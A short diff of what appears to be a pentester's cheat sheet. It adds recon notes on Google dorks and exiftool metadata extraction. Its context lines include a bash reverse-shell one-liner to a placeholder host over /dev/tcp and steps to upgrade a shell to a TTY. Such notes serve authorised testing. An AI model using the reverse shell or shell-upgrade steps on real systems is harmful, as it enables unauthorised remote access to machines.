@@ -242,9 +242,15 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 
 #### FUFF
 
-
 #### PASSIVE TOOLS
 ##### PHONEBOOK.cz
+
+#### GOOGLE DORKS
+- site:DOMAIN
+- pentest-tools.com
+#### METADATA FROM DOCS
+
+`exiftool doc.pdf`: Extract the metadata from the document
 # Get a TTY
 `script /dev/null -c bash`
 CTRL + Z
